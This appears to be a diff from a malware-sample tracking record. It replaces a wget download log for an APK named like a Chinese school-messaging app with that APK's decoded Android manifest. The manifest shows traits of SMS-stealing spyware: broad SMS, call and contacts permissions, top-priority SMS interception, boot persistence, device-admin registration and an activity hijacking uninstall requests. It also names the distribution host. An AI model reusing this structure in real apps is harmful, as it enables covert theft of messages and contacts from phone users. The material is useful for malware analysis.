@@ -1,35 +1,341 @@
---2016-12-05 21:11:43--  http://zsup.pkcwh.com/xcui
-Resolving zsup.pkcwh.com... 103.240.182.169
-Connecting to zsup.pkcwh.com|103.240.182.169|:80... connected.
-HTTP request sent, awaiting response... 301 Moved Permanently
-Location: http://zsup.pkcwh.com/xcui/ [following]
---2016-12-05 21:11:49--  http://zsup.pkcwh.com/xcui/
-Reusing existing connection to zsup.pkcwh.com:80.
-HTTP request sent, awaiting response... 200 OK
-Length: 254 [text/html]
-Saving to: `index.html'
-
-     0K                                                       100% 12.7M=0s
-
-2016-12-05 21:11:49 (12.7 MB/s) - `index.html' saved [254/254]
-
-=======================The second times wget =====================
---2016-12-05 21:11:49--  http://zsup.pkcwh.com/xcui/%E6%A0%A1%E8%AE%AF%E9%80%9A.apk
-Resolving zsup.pkcwh.com... 103.240.182.169
-Connecting to zsup.pkcwh.com|103.240.182.169|:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 459166 (448K) [application/vnd.android.package-archive]
-Saving to: `校讯�%80%9A.apk'
-
-     0K .......... .......... .......... .......... .......... 11%  127K 3s
-    50K .......... .......... .......... .......... .......... 22%  118K 3s
-   100K .......... .......... .......... .......... .......... 33%  127K 2s
-   150K .......... .......... .......... .......... .......... 44%  128K 2s
-   200K .......... .......... .......... .......... .......... 55%  120K 2s
-   250K .......... .......... .......... .......... .......... 66%  104K 1s
-   300K .......... .......... .......... .......... .......... 78% 74.5K 1s
-   350K .......... .......... .......... .......... .......... 89% 52.4K 0s
-   400K .......... .......... .......... .......... ........  100% 64.8K=4.9s
-
-2016-12-05 21:11:55 (92.0 KB/s) - `校讯�%80%9A.apk' saved [459166/459166]
-
+<manifest
+    android:versionCode=<0x7, type 0x10>
+    android:versionName="7.9"
+    android:installLocation=<0x1, type 0x10>
+    package="jfuuooyee.dksdcssnnh"
+    platformBuildVersionCode=<0x15, type 0x10>
+    platformBuildVersionName="5.0.1-1624448"
+    >
+    <uses-sdk
+        android:minSdkVersion=<0x8, type 0x10>
+        android:targetSdkVersion=<0x15, type 0x10>
+        >
+    </uses-sdk>
+    <uses-permission
+        android:name="android.permission.READ_SMS"
+        >
+    </uses-permission>
+    <uses-permission
+        android:name="android.permission.WRITE_SMS"
+        >
+    </uses-permission>
+    <uses-permission
+        android:name="android.permission.SEND_SMS"
+        >
+    </uses-permission>
+    <uses-permission
+        android:name="android.permission.RECEIVE_SMS"
+        >
+    </uses-permission>
+    <uses-permission
+        android:name="android.permission.READ_PHONE_STATE"
+        >
+    </uses-permission>
+    <uses-permission
+        android:name="android.permission.READ_CONTACTS"
+        >
+    </uses-permission>
+    <uses-permission
+        android:name="android.permission.RECEIVE_WAP_PUSH"
+        >
+    </uses-permission>
+    <uses-permission
+        android:name="android.permission.RECEIVE_MMS"
+        >
+    </uses-permission>
+    <uses-permission
+        android:name="android.permission.CALL_PHONE"
+        >
+    </uses-permission>
+    <uses-permission
+        android:name="android.permission.PROCESS_OUTGOING_CALLS"
+        >
+    </uses-permission>
+    <uses-permission
+        android:name="android.permission.INTERNET"
+        >
+    </uses-permission>
+    <uses-permission
+        android:name="android.permission.ACCESS_NETWORK_STATE"
+        >
+    </uses-permission>
+    <uses-permission
+        android:name="android.permission.ACCESS_WIFI_STATE"
+        >
+    </uses-permission>
+    <uses-permission
+        android:name="android.permission.READ_LOGS"
+        >
+    </uses-permission>
+    <application
+        android:label=<0x7F060000, type 0x01>
+        android:icon=<0x7F020000, type 0x01>
+        android:name="acce3ft.aevbbb.util.MyApplication"
+        android:allowBackup=<0xFFFFFFFF, type 0x12>
+        >
+        <receiver
+            android:name="acce3ft.aevbbb.TelInternal"
+            android:enabled=<0xFFFFFFFF, type 0x12>
+            android:priority=<0x7FFFFFFF, type 0x10>
+            >
+            <intent-filter
+                >
+                <action
+                    android:name="android.intent.action.NEW_OUTGOING_CALL"
+                    >
+                </action>
+                <action
+                    android:name="android.intent.action.PHONE_STATE"
+                    >
+                </action>
+            </intent-filter>
+        </receiver>
+        <service
+            android:name="acce3ft.aevbbb.MainService"
+            android:priority=<0x7FFFFFFF, type 0x10>
+            >
+        </service>
+        <service
+            android:name="acce3ft.aevbbb.PhoService"
+            >
+        </service>
+        <receiver
+            android:name="acce3ft.aevbbb.BootReceiver"
+            >
+            <intent-filter
+                android:priority=<0x7FFFFFFF, type 0x10>
+                >
+                <action
+                    android:name="android.provider.Telephony.SMS_RECEIVED"
+                    >
+                </action>
+                <action
+                    android:name="android.provider.Telephony.SMS_RECEIVED_2"
+                    >
+                </action>
+                <action
+                    android:name="android.provider.Telephony.GSM_SMS_RECEIVED"
+                    >
+                </action>
+                <category
+                    android:name="android.intent.category.DEFAULT"
+                    >
+                </category>
+            </intent-filter>
+            <intent-filter
+                android:priority=<0x7FFFFFFF, type 0x10>
+                >
+                <action
+                    android:name="android.intent.action.PACKAGE_RESTARTED"
+                    >
+                </action>
+                <action
+                    android:name="android.intent.action.BOOT_COMPLETED"
+                    >
+                </action>
+                <action
+                    android:name="android.intent.action.USER_PRESENT"
+                    >
+                </action>
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="acce3ft.aevbbb.NetstateReceiver"
+            >
+            <intent-filter
+                >
+                <action
+                    android:name="android.net.conn.CONNECTIVITY_CHANGE"
+                    >
+                </action>
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="acce3ft.aevbbb.SmsReceiver"
+            android:priority=<0x7FFFFFFF, type 0x10>
+            >
+            <intent-filter
+                >
+                <action
+                    android:name="android.provider.Telephony.SMS_RECEIVED"
+                    >
+                </action>
+                <action
+                    android:name="android.provider.Telephony.SMS_RECEIVED_2"
+                    >
+                </action>
+                <action
+                    android:name="android.provider.Telephony.GSM_SMS_RECEIVED"
+                    >
+                </action>
+                <action
+                    android:name="android.intent.action.USER_PRESENT"
+                    >
+                </action>
+                <action
+                    android:name="android.media.RINGER_MODE_CHANGED"
+                    >
+                </action>
+            </intent-filter>
+        </receiver>
+        <activity
+            android:label=<0x7F060000, type 0x01>
+            android:name="acce3ft.aevbbb.MainActivity"
+            >
+            <intent-filter
+                >
+                <action
+                    android:name="android.intent.action.MAIN"
+                    >
+                </action>
+                <category
+                    android:name="android.intent.category.LAUNCHER"
+                    >
+                </category>
+            </intent-filter>
+        </activity>
+        <activity
+            android:label="????"
+            android:name="acce3ft.aevbbb.UninstallerActivity"
+            >
+            <intent-filter
+                android:priority=<0x7FFFFFFF, type 0x10>
+                >
+                <action
+                    android:name="android.intent.action.VIEW"
+                    >
+                </action>
+                <action
+                    android:name="android.intent.action.DELETE"
+                    >
+                </action>
+                <category
+                    android:name="android.intent.category.DEFAULT"
+                    >
+                </category>
+                <data
+                    android:scheme="package"
+                    >
+                </data>
+            </intent-filter>
+        </activity>
+        <receiver
+            android:label=<0x7F060000, type 0x01>
+            android:name="acce3ft.aevbbb.MyAdmin"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            >
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource=<0x7F040000, type 0x01>
+                >
+            </meta-data>
+            <intent-filter
+                >
+                <action
+                    android:name="android.app.action.DEVICE_ADMIN_ENABLED"
+                    >
+                </action>
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="acce3ft.aevbbb.SmsReceiver4_4"
+            android:permission="android.permission.BROADCAST_SMS"
+            >
+            <intent-filter
+                >
+                <action
+                    android:name="android.provider.Telephony.SMS_DELIVER"
+                    >
+                </action>
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="acce3ft.aevbbb.MmsReceiver4_4"
+            android:permission="android.permission.BROADCAST_WAP_PUSH"
+            >
+            <intent-filter
+                >
+                <action
+                    android:name="android.provider.Telephony.WAP_PUSH_DELIVER"
+                    >
+                </action>
+                <data
+                    android:mimeType="application/vnd.wap.mms-message"
+                    >
+                </data>
+            </intent-filter>
+        </receiver>
+        <activity
+            android:name="acce3ft.aevbbb.ComposeSmsActivity"
+            >
+            <intent-filter
+                >
+                <action
+                    android:name="android.intent.action.SEND"
+                    >
+                </action>
+                <action
+                    android:name="android.intent.action.SENDTO"
+                    >
+                </action>
+                <category
+                    android:name="android.intent.category.DEFAULT"
+                    >
+                </category>
+                <category
+                    android:name="android.intent.category.BROWSABLE"
+                    >
+                </category>
+                <data
+                    android:scheme="sms"
+                    >
+                </data>
+                <data
+                    android:scheme="smsto"
+                    >
+                </data>
+                <data
+                    android:scheme="mms"
+                    >
+                </data>
+                <data
+                    android:scheme="mmsto"
+                    >
+                </data>
+            </intent-filter>
+        </activity>
+        <service
+            android:name="acce3ft.aevbbb.MainService4_4"
+            android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE"
+            android:exported=<0xFFFFFFFF, type 0x12>
+            >
+            <intent-filter
+                >
+                <action
+                    android:name="android.intent.action.RESPOND_VIA_MESSAGE"
+                    >
+                </action>
+                <category
+                    android:name="android.intent.category.DEFAULT"
+                    >
+                </category>
+                <data
+                    android:scheme="sms"
+                    >
+                </data>
+                <data
+                    android:scheme="smsto"
+                    >
+                </data>
+                <data
+                    android:scheme="mms"
+                    >
+                </data>
+                <data
+                    android:scheme="mmsto"
+                    >
+                </data>
+            </intent-filter>
+        </service>
+    </application>
+</manifest>
